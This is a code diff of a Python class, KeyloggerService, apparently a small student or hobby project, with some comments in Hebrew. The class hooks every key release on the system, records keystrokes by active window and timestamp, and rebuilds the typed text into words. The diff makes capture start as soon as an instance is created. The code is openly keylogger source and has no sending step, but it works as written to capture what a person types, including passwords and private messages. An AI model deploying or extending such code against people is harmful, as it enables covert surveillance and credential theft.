@@ -7,29 +7,34 @@ class KeyloggerService:
 
     def __init__(self):
         self.data = {}
+        self.getKeyWord()
+        #self.getData()
 
     def getKeyWord(self):
         def callback(event):
-            eventName = event.name
+            event_name = event.name.replace("space", " ").replace("enter", "\n")
+
             current_time = self.getTime(event)
             activeWindow = self.getWindowName()
 
             if activeWindow not in self.data:
                 self.data[activeWindow] = {}
             if current_time not in self.data[activeWindow]:
-                self.data[activeWindow][current_time] = []
-            self.data[activeWindow][current_time].append(eventName)
+                self.data[activeWindow][current_time] = ""
+
+            self.data[activeWindow][current_time] += event_name
 
         keyboard.on_release(callback)
 
 
     def getData(self):
         print("\nData collected:")
+        time.sleep(5)
         for window, timestamps in self.data.items():
             print(f"\n window: {window}")
 
             # מחברים את כל התווים למחרוזת אחת
-            all_keys = "".join("".join(keys).replace("space"," ") for keys in timestamps.values())
+            all_keys = "".join("".join(keys).replace("space"," ").replace("enter", "\n") for keys in timestamps.values())
 
             # מחלקים למילים לפי רווחים
             words = all_keys.split()
@@ -46,16 +51,3 @@ class KeyloggerService:
     def getTime(self, event):
         return datetime.fromtimestamp(event.time).strftime("%Y-%m-%d %H:%M")
 
-# יצירת מופע והפעלת ההאזנה
-keylogger = KeyloggerService()
-keylogger.getKeyWord()
-
-# מחכים 10 שניות כדי לאסוף נתונים ואז מדפיסים
-
-time.sleep(25)
-
-# הדפסת הנתונים שנאספו
-keylogger.getData()
-
-
-#  Saay my name
